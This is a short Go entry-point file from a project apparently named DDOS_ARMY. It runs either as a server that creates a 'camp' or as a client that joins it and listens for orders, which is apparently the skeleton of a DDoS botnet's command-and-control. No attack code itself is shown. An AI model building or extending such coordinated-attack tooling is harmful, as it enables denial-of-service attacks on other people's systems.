package main

import (
	"DDOS_ARMY/camp"
	"DDOS_ARMY/client"
	"DDOS_ARMY/server"
	"flag"
	"log"
	"os"
	"os/signal"
)

func main() {
	// -server
	sf := flag.Bool("server", false, "run as server")
	// -client
	cf := flag.Bool("client", false, "run as client")

	flag.Parse()

	if *sf {
		log.Println("Server started")
		log.Println("Server is listening on port 8080")
		camp.NewCamp("#XORbit", "127.0.0.1:22")
		log.Println("camp create by leader : ", camp.GetCamp().Leader.Name)
		server.StartServer("0.0.0.0", "8080")
	}
	if *cf {
		c := client.GetClient()
		log.Println("trying Joining camp ", c.TargetServer, "...")
		_, err := c.JoinCamp()
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		log.Println("Joined camp ", c.TargetServer)
		interrupt := make(chan os.Signal, 1)
		signal.Notify(interrupt, os.Interrupt)
		go c.ListenToOrders()
		<-interrupt
		log.Println("Interrupt signal received, stopping...")
		c.LeaveCamp()
	}
}
